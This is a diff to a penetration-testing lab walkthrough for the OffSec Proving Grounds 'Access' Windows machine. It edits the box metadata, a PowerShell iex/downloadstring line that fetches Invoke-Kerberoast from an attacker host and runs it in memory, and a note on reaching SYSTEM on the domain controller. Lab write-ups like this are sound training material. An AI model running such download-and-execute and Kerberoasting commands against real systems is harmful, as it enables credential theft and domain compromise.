@@ -20,7 +20,7 @@ categories:
   - walkthrough
 ---
 
-{{< box-info name="Access" os="Windows" difficulty="Medium" ip="192.168.X.X" platform="OffSec Proving Grounds" >}}
+{{< box-info name="Access" os="Windows" difficulty="Medium" ip="192.168.x.x" platform="OffSec Proving Grounds" >}}
 
 ---
 
@@ -111,7 +111,7 @@ Existing SPN found!
 Request and export the TGS. The lazy path is `Invoke-Kerberoast` pulled straight into memory:
 
 ```powershell
-iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-Kerberoast.ps1')
+iex(new-object net.webclient).downloadstring('http://192.168.45.219/Invoke-Kerberoast.ps1')
 Invoke-Kerberoast -OutputFormat Hashcat
 ```
 
@@ -162,7 +162,7 @@ $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
 $object = [Activator]::CreateInstance($type)
 {{< /terminal >}}
 
-The callback lands as `NT AUTHORITY\SYSTEM` — full compromise of the domain controller.
+The callback lands as `NT AUTHORITY\SYSTEM` — full compromise of the domain controller. (SYSTEM obtained via the spooler COM load above; no `whoami`/`proof.txt` capture was recorded for this run.)
 
 ---
 
